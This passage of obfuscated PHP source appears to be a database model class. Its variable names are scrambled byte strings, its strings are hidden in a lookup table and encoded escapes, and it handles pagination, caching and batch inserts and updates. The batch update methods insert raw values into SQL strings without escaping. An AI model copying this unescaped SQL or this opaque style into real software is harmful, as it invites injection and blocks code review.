$this->dataAuto = $Ê‹°ñ…Ú; } public function __construct($ÑàøŠ„© = '', $€„É…¡š = '', $©˜×Å¢° = '') { parent::__construct($ÑàøŠ„©, $€„É…¡š, $©˜×Å¢°); } protected $tableMeta = array(); protected function _beforeInsert(&$³›„ÉÈÆ, $ƒŠ£Ö›„) { $òß¯“‘¸ =& $_SERVER[® ¨Ä®ñ]; if (!$this->checkDataAutoHas($òß¯“‘¸[350])) { return; } $this->dataBeforeFilter($³›„ÉÈÆ, $òß¯“‘¸[350]); } protected function _beforeUpdate(&$…ÀÓ‡¿, $ëáıÑã®) { $Â›‹Ş“Û =& $_SERVER[® ¨Ä®ñ]; if (!$this->checkDataAutoHas($Â›‹Ş“Û[351])) { return; } $this->dataBeforeFilter($…ÀÓ‡¿, $Â›‹Ş“Û[351]); } protected function _afterSelect(&$­ƒú¡ñ¶, $‚Æ»Ğ»ğ) { if (!is_array($­ƒú¡ñ¶)) { return; } if (!$this->checkDataAutoHas($_SERVER[® ¨Ä®ñ][352])) { return; } foreach ($­ƒú¡ñ¶ as &$øÊÜ‰²) { $this->dataAfterFilter($øÊÜ‰²); } unset($øÊÜ‰²); } protected function _afterFind(&$Ÿ‰Êşì¾, $¦ç–†´) { if (!is_array($Ÿ‰Êşì¾)) { return; } if (!$this->checkDataAutoHas($_SERVER[® ¨Ä®ñ][352])) { return; } $this->dataAfterFilter($Ÿ‰Êşì¾); } public static function textEncode($½Ã–ñ´‘) { if (!$½Ã–ñ´‘) { return $½Ã–ñ´‘; } $Ãù‡Ğà‡ = json_encode($½Ã–ñ´‘); $Ãù‡Ğà‡ = preg_replace_callback($_SERVER[® ¨Ä®ñ][353], function ($Ñ×ªµ¼) { return addslashes($Ñ×ªµ¼[0]); }, $Ãù‡Ğà‡); return json_decode($Ãù‡Ğà‡); } public static function textDecode($í—³Ò«) { $£»ï‡ö =& $_SERVER[® ¨Ä®ñ]; $™‹ìÀ© = json_encode($í—³Ò«); $™‹ìÀ© = preg_replace_callback($£»ï‡ö[354], function ($‚ëè³İ«) { return $_SERVER[® ¨Ä®ñ][98]; }, $™‹ìÀ©); return json_decode($™‹ìÀ©); } public function setAutoIncrement($‰ü»ŞÕ) { $½ÓÈ»ºé = array($this->getPk() => $‰ü»ŞÕ); $ô„Äê¹Å = $this->data($½ÓÈ»ºé)->add(); if ($ô„Äê¹Å) { $this->delete($ô„Äê¹Å); } } public function getAutoIncrement() { $ò”³›¶ü = $this->getTableName(); $Ö´œôó’ = $this->max($this->getPk()); $å×şåºˆ = $this->query("\163\x68\x6f\x77\40\164\x61\142\x6c\x65\40\163\164\x61\164\x75\x73\x20\x77\x68\x65\162\x65\40\116\141\155\145\x3d\47{$ò”³›¶ü}\x27"); $öğ±• • = $å×şåºˆ[0][$_SERVER[® ¨Ä®ñ][355]]; $—¸…ìœ© = max($Ö´œôó’, $öğ±• •); return $—¸…ìœ©; } protected function _callBefore($Ù¸³Äøû, $ºÒ›¹òØ) { return $this->cacheCallCheck($Ù¸³Äøû, $ºÒ›¹òØ, !1); } protected function _callAfter($Œ†Š“Éï, $ˆ÷ÅÜ‘) { return $this->cacheCallCheck($Œ†Š“Éï, $ˆ÷ÅÜ‘, !0); } protected function cacheFunctionAlias($ï‡ÕÜ€Ã) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($’’İÇ, $ÏšÏÖÂİ, $—ÒÀ÷» = false) { $Šùó™½ = $this->cacheFunctionAlias($ÏšÏÖÂİ); if (!$Šùó™½) { return; } foreach ($Šùó™½ as $Ø©¢µ => $˜‚¸ĞŞì) { $¹Ú€Œ = $˜‚¸ĞŞì[0]; $˜ˆº†¾ã = explode($_SERVER[® ¨Ä®ñ][50], $˜‚¸ĞŞì[1]); if ($’’İÇ == $Ø©¢µ) { return $this->cacheFunctionGet($Ø©¢µ, $¹Ú€Œ); } if ($—ÒÀ÷» && in_array($’’İÇ, $˜ˆº†¾ã)) { $this->cacheFunctionClear($Ø©¢µ, $¹Ú€Œ); } } } public function cacheFunctionGet($†İß¤íµ, $÷˜¬ÒÚÏ) { $Ïùó×Ğ³ = $this->cacheKeyMake($†İß¤íµ, $÷˜¬ÒÚÏ); $ì…ğó²¶ = Cache::get($Ïùó×Ğ³); if (!is_array($ì…ğó²¶)) { $ì…ğó²¶ = call_user_func_array(array($this, $†İß¤íµ), array($÷˜¬ÒÚÏ, !0)); Cache::set($Ïùó×Ğ³, $ì…ğó²¶); } return $ì…ğó²¶; } public function cacheFunctionClear($¾ôÉÒší, $ Í¨í­¼) { $©¢Êúóë = $ Í¨í­¼; if (!is_array($ Í¨í­¼)) { $©¢Êúóë = array($ Í¨í­¼); } foreach ($©¢Êúóë as $¦è•àâî) { $óææ÷ û = $this->cacheKeyMake($¾ôÉÒší, $¦è•àâî); Cache::remove($óææ÷ û); } } private function cacheKeyMake($‹ŒúêşÎ, $ŸÚõëÔ˜) { $Ã–¹øÎÃ =& $_SERVER[® ¨Ä®ñ]; return get_class($this) . $Ã–¹øÎÃ[11] . $‹ŒúêşÎ . $Ã–¹øÎÃ[356] . $ŸÚõëÔ˜; } protected function selectPageReset() { $í¹Ä¡ú =& $_SERVER[® ¨Ä®ñ]; if (isset($GLOBALS[$í¹Ä¡ú[357]])) { return; } $GLOBALS[$í¹Ä¡ú[357]] = isset($GLOBALS[$í¹Ä¡ú[7]][$í¹Ä¡ú[358]]) ? $GLOBALS[$í¹Ä¡ú[7]][$í¹Ä¡ú[358]] : !1; $GLOBALS[$í¹Ä¡ú[359]] = isset($GLOBALS[$í¹Ä¡ú[7]][$í¹Ä¡ú[348]]) ? $GLOBALS[$í¹Ä¡ú[7]][$í¹Ä¡ú[348]] : !1; $GLOBALS[$í¹Ä¡ú[7]][$í¹Ä¡ú[358]] = !1; $GLOBALS[$í¹Ä¡ú[7]][$í¹Ä¡ú[348]] = !1; } protected function selectPageRestore() { $Â¦”–Ó’ =& $_SERVER[® ¨Ä®ñ]; if (!isset($GLOBALS[$Â¦”–Ó’[357]])) { return; } $GLOBALS[$Â¦”–Ó’[7]][$Â¦”–Ó’[358]] = $GLOBALS[$Â¦”–Ó’[357]]; $GLOBALS[$Â¦”–Ó’[7]][$Â¦”–Ó’[348]] = $GLOBALS[$Â¦”–Ó’[359]]; if ($GLOBALS[$Â¦”–Ó’[7]][$Â¦”–Ó’[358]] === !1) { unset($GLOBALS[$Â¦”–Ó’[7]][$Â¦”–Ó’[358]]); } if ($GLOBALS[$Â¦”–Ó’[7]][$Â¦”–Ó’[348]] === !1) { unset($GLOBALS[$Â¦”–Ó’[7]][$Â¦”–Ó’[348]]); } unset($GLOBALS[$Â¦”–Ó’[357]]); unset($GLOBALS[$Â¦”–Ó’[359]]); } protected function selectPage($ö«ïÅš = 200, $Ï‡ñªÄ– = 1) { $£¶…´ìÅ =& $_SERVER[® ¨Ä®ñ]; global $in; $¢„‘Ò• = $this->optionsValue(); $Œˆ—šå• = 50000; $ö«ïÅš = isset($in[$£¶…´ìÅ[358]]) && $in[$£¶…´ìÅ[358]] ? $in[$£¶…´ìÅ[358]] : $ö«ïÅš; if ($ö«ïÅš === -1) { $in[$£¶…´ìÅ[358]] = !1; $Œˆ—šå• = 100000000; $ö«ïÅš = $Œˆ—šå•; } $Åš«—ö = $¢„‘Ò•; $Åš«—ö[$£¶…´ìÅ[360]] = array(); $ö«ïÅš = intval($ö«ïÅš); $ö«ïÅš = $ö«ïÅš <= 5 ? 5 : ($ö«ïÅš >= $Œˆ—šå• ? $Œˆ—šå• : $ö«ïÅš); $Ï‡ñªÄ– = intval(isset($in[$£¶…´ìÅ[348]]) && $in[$£¶…´ìÅ[348]] ? $in[$£¶…´ìÅ[348]] : $Ï‡ñªÄ–); $Ï‡ñªÄ– = $Ï‡ñªÄ– <= 1 ? 1 : $Ï‡ñªÄ–; $ˆ¶Ûß¬– = array(); $ı«‹¬¼ = 1; if ($Ï‡ñªÄ– == 1 && $ı«‹¬¼) { $this->optionsValue($¢„‘Ò•); $ˆ¶Ûß¬– = $this->page($Ï‡ñªÄ–, $ö«ïÅš)->select(); $ÂÔÈ–åÏ = is_array($ˆ¶Ûß¬–) ? count($ˆ¶Ûß¬–) : 0; if ($ÂÔÈ–åÏ < $ö«ïÅš) { $¬È´¶ü‰ = 1; } else { $this->optionsValue($Åš«—ö); $ÂÔÈ–åÏ = intval($this->count()); $¬È´¶ü‰ = ceil($ÂÔÈ–åÏ / $ö«ïÅš); } } else { $this->optionsValue($Åš«—ö); $ÂÔÈ–åÏ = intval($this->count()); $¬È´¶ü‰ = ceil($ÂÔÈ–åÏ / $ö«ïÅš); $Ï‡ñªÄ– = $Ï‡ñªÄ– >= $¬È´¶ü‰ ? $¬È´¶ü‰ : $Ï‡ñªÄ–; $this->optionsValue($¢„‘Ò•); $ˆ¶Ûß¬– = $this->page($Ï‡ñªÄ–, $ö«ïÅš)->select(); } if (!is_array($ˆ¶Ûß¬–)) { $ˆ¶Ûß¬– = array(); } if ($¬È´¶ü‰ == 1) { $ÂÔÈ–åÏ = count($ˆ¶Ûß¬–); } $öô©ƒª² = array($£¶…´ìÅ[361] => array($£¶…´ìÅ[362] => $ÂÔÈ–åÏ, $£¶…´ìÅ[358] => $ö«ïÅš, $£¶…´ìÅ[348] => $Ï‡ñªÄ–, $£¶…´ìÅ[363] => $¬È´¶ü‰), $£¶…´ìÅ[364] => $ˆ¶Ûß¬–); return $öô©ƒª²; } protected function checkLength($ƒ€ÔĞÍŒ, $òÊ õÄ× = 0, $ÂÔÇÃø = '') { $®˜Ğåü =& $_SERVER[® ¨Ä®ñ]; $òÊ õÄ× = $òÊ õÄ× ? $òÊ õÄ× : 65536; if (!$ƒ€ÔĞÍŒ || strlen($ƒ€ÔĞÍŒ) < $òÊ õÄ×) { return; } $ÂÔÇÃø = $ÂÔÇÃø ? $ÂÔÇÃø . $®˜Ğåü[71] : $®˜Ğåü[12]; show_json($ÂÔÇÃø . LNG($®˜Ğåü[365]) . "\50{$òÊ õÄ×}\x29", !1); } protected function metaSet($ÇˆŒÁ´, $ª‹ç†Ã¬ = null, $¹èá” = null) { $ÇÕÌí§ç =& $_SERVER[® ¨Ä®ñ]; if (!$this->tableMeta || !$ÇˆŒÁ´) { return !1; } $Êµ››Ÿ¨ = $this->tableMeta[$ÇÕÌí§ç[366]]; $È¥µÎÂÃ = $this->tableMeta[$ÇÕÌí§ç[367]]; $ÕˆùÛˆÀ = Model($È¥µÎÂÃ); $ä‰Ÿ¹Í = array($Êµ››Ÿ¨ => $ÇˆŒÁ´, $ÇÕÌí§ç[368] => $ª‹ç†Ã¬); if (is_null($ª‹ç†Ã¬)) { return $ÕˆùÛˆÀ->where(array($Êµ››Ÿ¨ => $ÇˆŒÁ´))->delete(); } if (is_null($¹èá”) && is_string($ª‹ç†Ã¬)) { return $ÕˆùÛˆÀ->where($ä‰Ÿ¹Í)->delete(); } $—£ôØã = is_array($ª‹ç†Ã¬) ? $ª‹ç†Ã¬ : array(); if (is_string($ª‹ç†Ã¬)) { $—£ôØã[$ª‹ç†Ã¬] = $¹èá”; } $¢²ğÖŠ½ = array(); foreach ($—£ôØã as $æ‘â´ÆÑ => $™ª¸§Ùà) { if (is_null($™ª¸§Ùà) && is_string($æ‘â´ÆÑ)) { $ÕˆùÛˆÀ->where(array($Êµ››Ÿ¨ => $ÇˆŒÁ´, $ÇÕÌí§ç[368] => $æ‘â´ÆÑ))->delete(); continue; } $this->checkLength($™ª¸§Ùà, !1, $È¥µÎÂÃ . $ÇÕÌí§ç[4] . $æ‘â´ÆÑ); $¢²ğÖŠ½[] = array($Êµ››Ÿ¨ => $ÇˆŒÁ´, $ÇÕÌí§ç[95] => $æ‘â´ÆÑ, $ÇÕÌí§ç[369] => $™ª¸§Ùà); } $Î‚×Öú˜ = $ÇÕÌí§ç[370] . $È¥µÎÂÃ; CacheLock::lock($Î‚×Öú˜); $ÕˆùÛˆÀ->where(array($Êµ››Ÿ¨ => $ÇˆŒÁ´))->addAll($¢²ğÖŠ½, array(), !0); CacheLock::unlock($Î‚×Öú˜); return !0; } public function metaGet($øŒšË”, $‰äƒÙÀ¶ = false) { $Ğ¿æ¡øš =& $_SERVER[® ¨Ä®ñ]; if (!$this->tableMeta) { return array(); } $…••¿Î = $this->tableMeta[$Ğ¿æ¡øš[366]]; $—¥¥­¤È = Model($this->tableMeta[$Ğ¿æ¡øš[367]]); if ($‰äƒÙÀ¶) { $®ıÁÙ´ê = array($…••¿Î => $øŒšË”, $Ğ¿æ¡øš[95] => $‰äƒÙÀ¶); return $—¥¥­¤È->where($®ıÁÙ´ê)->getField($Ğ¿æ¡øš[369]); } $®ıÁÙ´ê = array($…••¿Î => $øŒšË”); $­Æß”´Ó = $—¥¥­¤È->field($Ğ¿æ¡øš[371])->where($®ıÁÙ´ê)->select(); $­Æß”´Ó = array_to_keyvalue($­Æß”´Ó, $Ğ¿æ¡øš[95], $Ğ¿æ¡øš[369]); return $­Æß”´Ó; } private function checkDataAutoHas($¬íÊÚ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÉßÖ¦ê’) { if (in_array($¬íÊÚ, explode($_SERVER[® ¨Ä®ñ][50], $ÉßÖ¦ê’[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$å±‚ôÇ˜, $Ü¯ò¹ãÖ) { $“™©„Õö =& $_SERVER[® ¨Ä®ñ]; if (!is_array($å±‚ôÇ˜)) { return; } foreach ($this->dataAuto as $ «Í² ) { $„ŸÙ¿³ = $ «Í² [0]; if (!in_array($Ü¯ò¹ãÖ, explode($“™©„Õö[50], $ «Í² [2]))) { continue; } switch (trim($ «Í² [3])) { case $“™©„Õö[316]: case $“™©„Õö[317]: $Ç¹º„…Ï = $ «Í² [1]; $Á——î”¼ = isset($ «Í² [4]) ? (array) $ «Í² [4] : array(); if ($Ç¹º„…Ï == $“™©„Õö[196] && array_key_exists($„ŸÙ¿³, $å±‚ôÇ˜)) { if (!$å±‚ôÇ˜[$„ŸÙ¿³]) { unset($å±‚ôÇ˜[$„ŸÙ¿³]); } break; } if (isset($å±‚ôÇ˜[$„ŸÙ¿³])) { array_unshift($Á——î”¼, $å±‚ôÇ˜[$„ŸÙ¿³]); } if ($“™©„Õö[316] == $ «Í² [3]) { $å±‚ôÇ˜[$„ŸÙ¿³] = call_user_func_array($Ç¹º„…Ï, $Á——î”¼); } else { $å±‚ôÇ˜[$„ŸÙ¿³] = call_user_func_array(array(&$this, $Ç¹º„…Ï), $Á——î”¼); } break; case $“™©„Õö[265]: if (isset($å±‚ôÇ˜[$„ŸÙ¿³]) && $å±‚ôÇ˜[$„ŸÙ¿³]) { $å±‚ôÇ˜[$„ŸÙ¿³] = call_user_func_array(array(&$this, $ «Í² [1]), array($å±‚ôÇ˜[$„ŸÙ¿³])); } break; case $“™©„Õö[268]: $å±‚ôÇ˜[$„ŸÙ¿³] = $å±‚ôÇ˜[$ «Í² [1]]; break; case $“™©„Õö[289]: if (isset($å±‚ôÇ˜[$„ŸÙ¿³]) && !is_string($å±‚ôÇ˜[$„ŸÙ¿³])) { $å±‚ôÇ˜[$„ŸÙ¿³] = json_encode_force($å±‚ôÇ˜[$„ŸÙ¿³]); } break; case $“™©„Õö[318]: if ($å±‚ôÇ˜[$„ŸÙ¿³] === $“™©„Õö[12]) { unset($å±‚ôÇ˜[$„ŸÙ¿³]); } break; case $“™©„Õö[319]: $å±‚ôÇ˜[$„ŸÙ¿³] = $ «Í² [1]; default: break; } } if ($Ü¯ò¹ãÖ == $“™©„Õö[350]) { $óŒä‰ò† = strtolower($this->db->getDbType()); if (strpos($óŒä‰ò†, $“™©„Õö[13]) !== 0) { return; } $öĞÎ“Çù = $this->field(!0)->fields; $•±Ï×»ã = $öĞÎ“Çù[$“™©„Õö[247]]; if (isset($öĞÎ“Çù[$“™©„Õö[246]])) { unset($•±Ï×»ã[$öĞÎ“Çù[$“™©„Õö[246]]]); } foreach ($•±Ï×»ã as $ùÅ°¨ïæ => $Ü¯ò¹ãÖ) { if (!isset($å±‚ôÇ˜[$ùÅ°¨ïæ])) { $å±‚ôÇ˜[$ùÅ°¨ïæ] = $“™©„Õö[12]; } } } } private function dataAfterFilter(&$Ë–÷¿í) { $Ş—¢©´ =& $_SERVER[® ¨Ä®ñ]; foreach ($this->dataAuto as $ÌœÚ•Ã’) { $¥¼¢ƒ¨ = $ÌœÚ•Ã’[0]; if (!isset($Ë–÷¿í[$¥¼¢ƒ¨])) { continue; } if (!in_array($Ş—¢©´[352], explode($Ş—¢©´[50], $ÌœÚ•Ã’[2]))) { continue; } switch (trim($ÌœÚ•Ã’[3])) { case $Ş—¢©´[316]: case $Ş—¢©´[317]: $®’¯¸…ˆ = isset($ÌœÚ•Ã’[4]) ? (array) $ÌœÚ•Ã’[4] : array(); array_unshift($®’¯¸…ˆ, $Ë–÷¿í[$¥¼¢ƒ¨]); if (isset($ÌœÚ•Ã’[4]) && $ÌœÚ•Ã’[4] == $Ş—¢©´[372]) { $®’¯¸…ˆ = array($Ë–÷¿í[$¥¼¢ƒ¨]); } if ($Ş—¢©´[316] == $ÌœÚ•Ã’[3]) { $Ë–÷¿í[$¥¼¢ƒ¨] = call_user_func_array($ÌœÚ•Ã’[1], $®’¯¸…ˆ); } else { $Ë–÷¿í[$¥¼¢ƒ¨] = call_user_func_array(array(&$this, $ÌœÚ•Ã’[1]), $®’¯¸…ˆ); } break; case $Ş—¢©´[265]: if (isset($Ë–÷¿í[$¥¼¢ƒ¨]) && $Ë–÷¿í[$¥¼¢ƒ¨]) { $Ë–÷¿í[$¥¼¢ƒ¨] = call_user_func_array(array(&$this, $ÌœÚ•Ã’[1]), array($Ë–÷¿í[$¥¼¢ƒ¨])); } break; case $Ş—¢©´[268]: $Ë–÷¿í[$¥¼¢ƒ¨] = $Ë–÷¿í[$ÌœÚ•Ã’[1]]; break; case $Ş—¢©´[289]: $ãµ¥ñÈ = $Ë–÷¿í[$¥¼¢ƒ¨]; $Ë–÷¿í[$¥¼¢ƒ¨] = json_decode($ãµ¥ñÈ, !0); if (is_null($Ë–÷¿í[$¥¼¢ƒ¨])) { $Ë–÷¿í[$¥¼¢ƒ¨] = $ãµ¥ñÈ; } break; case $Ş—¢©´[318]: if ($Ë–÷¿í[$¥¼¢ƒ¨] === $Ş—¢©´[12]) { unset($Ë–÷¿í[$¥¼¢ƒ¨]); } break; case $Ş—¢©´[319]: $Ë–÷¿í[$¥¼¢ƒ¨] = $ÌœÚ•Ã’[1]; break; default: break; } } } public function saveAll($÷¬¹”‡) { $ã±ëŞ‘„ =& $_SERVER[® ¨Ä®ñ]; $‡ä©ûğ› = $this->tablePrefix . $this->tableName; $ÛçÄå â = self::SQL_WHERE_IN_CHUNK; $÷¬¹”‡ = is_array($÷¬¹”‡) ? $÷¬¹”‡ : array(); $àîõÀƒ  = $ã±ëŞ‘„[373]; $ã„£„©Ÿ = 0; $êä¶¯… = array(); $ó­ò˜“ª = count($÷¬¹”‡); for ($ñëÅ£öŠ = 0; $ñëÅ£öŠ < $ó­ò˜“ª; $ñëÅ£öŠ++) { $‹İèÚÖ = $÷¬¹”‡[$ñëÅ£öŠ]; if (!is_array($‹İèÚÖ) || count($‹İèÚÖ) != 4) { continue; } $Ä“ª™ŠÕ = "\125\120\104\x41\124\x45\40\x60{$‡ä©ûğ›}\x60\40\x53\x45\x54\x20{$‹İèÚÖ[2]}\40\75\40\x43\101\123\105\x20{$‹İèÚÖ[0]}\40\xa"; if ($ã„£„©Ÿ == 0) { $àîõÀƒ  = $Ä“ª™ŠÕ; } $êä¶¯…[] = $ã±ëŞ‘„[117] . $‹İèÚÖ[1] . $ã±ëŞ‘„[117]; $ã„£„©Ÿ++; $àîõÀƒ  .= "\40\x57\110\105\116\x20\x27{$‹İèÚÖ[1]}\x27\x20\x54\x48\105\116\x20\x27{$‹İèÚÖ[3]}\47\x20\xa"; if ($ã„£„©Ÿ == $ÛçÄå â || $ñëÅ£öŠ == $ó­ò˜“ª - 1) { $ø±æ¾¿Ò = implode($ã±ëŞ‘„[50], $êä¶¯…); $àîõÀƒ  .= "\40\105\116\x44\40\40\x57\x48\x45\x52\x45\40{$‹İèÚÖ[0]}\40\x49\x4e\40\x28{$ø±æ¾¿Ò}\51\x20"; $this->execute($àîõÀƒ ); $ã„£„©Ÿ = 0; $àîõÀƒ  = $Ä“ª™ŠÕ; $this->chunkEventCheck(count($êä¶¯…)); $êä¶¯… = array(); } } $this->chunkEventSet(); } public function saveAllEach($¼•¨ğÀò) { $Üƒ¬»‡ =& $_SERVER[® ¨Ä®ñ]; $ñ¦ïï÷Œ = $this->tablePrefix . $this->tableName; foreach ($¼•¨ğÀò as $ŠîıØ) { if (!is_array($ŠîıØ) || count($ŠîıØ) != 4) { continue; } $îƒ†©›› = $ŠîıØ[0] . $Üƒ¬»‡[374] . $ŠîıØ[1] . $Üƒ¬»‡[117]; $©Óëœê» = $ŠîıØ[2] . $Üƒ¬»‡[374] . $ŠîıØ[3] . $Üƒ¬»‡[117]; $å¶„ãõş = "\165\x70\x64\x61\164\x65\40{$ñ¦ïï÷Œ}\40\163\x65\164\x20{$©Óëœê»}\40\x77\150\145\x72\x65\x20{$îƒ†©››}\73"; $this->execute($å¶„ãõş); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ı„Ã³èÒ = false, $€²²ÃñÈ = false) { $this->_chunkEvent = $ı„Ã³èÒ; $this->_chunkEventParam = $€²²ÃñÈ; } private function chunkEventCheck($ñõÏÃï²) { if (!$this->_chunkEvent) { return; } $ŞÍó³Î = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ŞÍó³Î[$_SERVER[® ¨Ä®ñ][375]] = $ñõÏÃï²; Hook::trigger($this->_chunkEvent, $ŞÍó³Î); } public function addAll($‰œìøı, $µ†ˆÇ­µ = array(), $‡´«ÏŸÙ = false) { $±ËÔí› =& $_SERVER[® ¨Ä®ñ]; ignore_timeout(); $ÑÂ•ˆü = self::SQL_WHERE_IN_CHUNK; if (empty($‰œìøı)) { $this->error = think_lang($±ËÔí›[266]); return !1; } $µ†ˆÇ­µ = $this->_parseOptions($µ†ˆÇ­µ); foreach ($‰œìøı as $›óŠ½›â => $ÉâşÃ­®) { $‰œìøı[$›óŠ½›â] = $this->_facade($ÉâşÃ­®); $this->_beforeInsert($‰œìøı[$›óŠ½›â], $µ†ˆÇ­µ); } if (method_exists($this->db, $±ËÔí›[267])) { for ($ø‹”çã÷ = 0; $ø‹”çã÷ < count($‰œìøı); $ø‹”çã÷ += $ÑÂ•ˆü) { $ıè‡¹•“ = array_slice($‰œìøı, $ø‹”çã÷, $ÑÂ•ˆü); if (!is_array($ıè‡¹•“) || count($ıè‡¹•“) == 0) { break; } $üÏµæ­ = $this->db->insertAll($ıè‡¹•“, $µ†ˆÇ­µ, $‡´«ÏŸÙ); $this->chunkEventCheck(count($ıè‡¹•“)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($‰œìøı as $›óŠ½›â => $ÉâşÃ­®) { $üÏµæ­ = $this->db->insert($ÉâşÃ­®, $µ†ˆÇ­µ, $‡´«ÏŸÙ); } $this->commit(); } if (!1 !== $üÏµæ­) { $Ş—ã¯¦ƒ = $this->getLastInsID(); if ($Ş—ã¯¦ƒ) { return $Ş—ã¯¦ƒ; } } return $üÏµæ­; } public function save($½ïŞ¹ñ¡ = '', $œ¡ØÒ†Ÿ = array()) { $øä ­Îƒ =& $_SERVER[® ¨Ä®ñ]; $şíàìƒÀ = self::SQL_WHERE_IN_CHUNK; $˜ªüò” = $this->optionsValue(); $ò’±Ğ¯ = $this->findWhereField($˜ªüò”); if (!$ò’±Ğ¯) { return parent::save($½ïŞ¹ñ¡, $œ¡ØÒ†Ÿ); } $ß©¬•Ç¬ = 0; $±«…Ï‚ = $˜ªüò”[$øä ­Îƒ[270]][$ò’±Ğ¯][1]; $±«…Ï‚ = is_array($±«…Ï‚) ? $±«…Ï‚ : array(); $¤†ÑŠ¨ = count($±«…Ï‚); for ($¢íÄÓ¹ğ = 0; $¢íÄÓ¹ğ < $¤†ÑŠ¨; $¢íÄÓ¹ğ += $şíàìƒÀ) { $Âêûß‚Ç = array_slice($±«…Ï‚, $¢íÄÓ¹ğ, $şíàìƒÀ); if (!is_array($Âêûß‚Ç) || count($Âêûß‚Ç) == 0) { break; } $˜ªüò”[$øä ­Îƒ[270]][$ò’±Ğ¯][1] = $Âêûß‚Ç; $this->optionsValue($˜ªüò”); $ß©¬•Ç¬ += parent::save($½ïŞ¹ñ¡, $œ¡ØÒ†Ÿ); $this->chunkEventCheck(count($Âêûß‚Ç)); } $this->chunkEventSet(); return $ß©¬•Ç¬; } public function add($¸‚ó›† = '', $ŞíÀÌú = array(), $Ü»Š±Ó = false) { if ($this->addTaskStatus && is_array($¸‚ó›†)) { $this->addTaskData[] = $¸‚ó›†; return; } return parent::add($¸‚ó›†, $ŞíÀÌú, $Ü»Š±Ó); } public function parseWhereLike($¢Â¦½¡á, $®Ù¡ºË = '', $ùñ«‘ìı = false, &$à’ÅóÖ¢ = false) { $óòÔÖí =& $_SERVER[® ¨Ä®ñ]; $Ã†¨†‹­ = $GLOBALS[$óòÔÖí[6]][$óòÔÖí[376]]; if (!$Ã†¨†‹­[$óòÔÖí[377]]) { return $¢Â¦½¡á; } if (!is_array($¢Â¦½¡á)) { return $¢Â¦½¡á; } $î®›ôÌ = array(); $Œ¯¿Áïª = 0; foreach ($¢Â¦½¡á as $šÔÈ÷¿ => $‚ÌÅŠ›©) { if (is_array($‚ÌÅŠ›©) && count($‚ÌÅŠ›©) == 2 && $‚ÌÅŠ›©[0] == $óòÔÖí[378] && is_string($‚ÌÅŠ›©[1]) && substr($‚ÌÅŠ›©[1], 0, 1) == $óòÔÖí[379] && substr($‚ÌÅŠ›©[1], strlen($‚ÌÅŠ›©[1]) - 1, 1) == $óòÔÖí[379]) { $à’ÅóÖ¢ = !0; $ÀõÂşÎ = is_string($šÔÈ÷¿) ? $šÔÈ÷¿ : $®Ù¡ºË; $ÙÃìÂ¯¶ = substr($‚ÌÅŠ›©[1], 1, strlen($‚ÌÅŠ›©[1]) - 2); $ÙÃìÂ¯¶ = $this->db->escapeString($ÙÃìÂ¯¶); if (!strpos($ÀõÂşÎ, $óòÔÖí[10])) { $ÀõÂşÎ = $óòÔÖí[380] . $ÀõÂşÎ . $óòÔÖí[380]; } $ášî•§ô = $óòÔÖí[181] . $ÙÃìÂ¯¶ . $óòÔÖí[181]; if ($Ã†¨†‹­[$óòÔÖí[381]]) { $ášî•§ô = $óòÔÖí[382] . $ÙÃìÂ¯¶ . $óòÔÖí[383]; if ($Ã†¨†‹­[$óòÔÖí[384]]) { $ášî•§ô = $óòÔÖí[383] . $ÙÃìÂ¯¶ . $óòÔÖí[382]; } } $î®›ôÌ[$Œ¯¿Áïª] = $óòÔÖí[385] . $ÀõÂşÎ . $óòÔÖí[386] . $ášî•§ô . $óòÔÖí[387]; $Œ¯¿Áïª++; continue; } if (is_array($‚ÌÅŠ›©)) { $®Ù¡ºË = is_string($šÔÈ÷¿) ? $šÔÈ÷¿ : $®Ù¡ºË; $‚ÌÅŠ›© = $this->parseWhereLike($‚ÌÅŠ›©, $®Ù¡ºË, !0, $à’ÅóÖ¢); } if (is_numeric($šÔÈ÷¿)) { $î®›ôÌ[$Œ¯¿Áïª] = $‚ÌÅŠ›©; $Œ¯¿Áïª++; } else { $î®›ôÌ[$šÔÈ÷¿] = $‚ÌÅŠ›©; } } if ($à’ÅóÖ¢ && !$ùñ«‘ìı) { } return $î®›ôÌ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($«Ü“Ï = array()) { $¦ÏÀ‹Âé =& $_SERVER[® ¨Ä®ñ]; $à°¤Ä›° = self::SQL_WHERE_IN_CHUNK; $ÜÚÇ­š‚ = $this->optionsValue(); $Á»‡›â¨ = $this->findWhereField($ÜÚÇ­š‚); if (!$Á»‡›â¨ || isset($ÜÚÇ­š‚[$¦ÏÀ‹Âé[287]]) || isset($ÜÚÇ­š‚[$¦ÏÀ‹Âé[348]])) { return parent::select($«Ü“Ï); } $•©Îã = $ÜÚÇ­š‚[$¦ÏÀ‹Âé[270]][$Á»‡›â¨][1]; $•©Îã = is_array($•©Îã) ? $•©Îã : array(); $ãÉ‰“¥Œ = null; for ($ğåÈ²•ñ = 0; $ğåÈ²•ñ < count($•©Îã); $ğåÈ²•ñ += $à°¤Ä›°) { $¸Ì’ª€Ì = array_slice($•©Îã, $ğåÈ²•ñ, $à°¤Ä›°); if (!is_array($¸Ì’ª€Ì) || count($¸Ì’ª€Ì) == 0) { break; } $ÜÚÇ­š‚[$¦ÏÀ‹Âé[270]][$Á»‡›â¨][1] = $¸Ì’ª€Ì; $this->optionsValue($ÜÚÇ­š‚); $ëü“Şè¬ = parent::select($«Ü“Ï); if (!$ëü“Şè¬) { continue; } $ãÉ‰“¥Œ = is_array($ãÉ‰“¥Œ) ? $ãÉ‰“¥Œ : array(); $ãÉ‰“¥Œ = array_merge($ãÉ‰“¥Œ, $ëü“Şè¬); } return $ãÉ‰“¥Œ; } public function delete($Ó»€è×è = array()) { $”òá˜© =& $_SERVER[® ¨Ä®ñ]; $ˆŞõ’ë‚ = self::SQL_WHERE_IN_CHUNK; $­£ë„ü¢ = $this->optionsValue(); $ö¨ªêû = $this->findWhereField($­£ë„ü¢); if (!$ö¨ªêû) { return parent::delete($Ó»€è×è); } 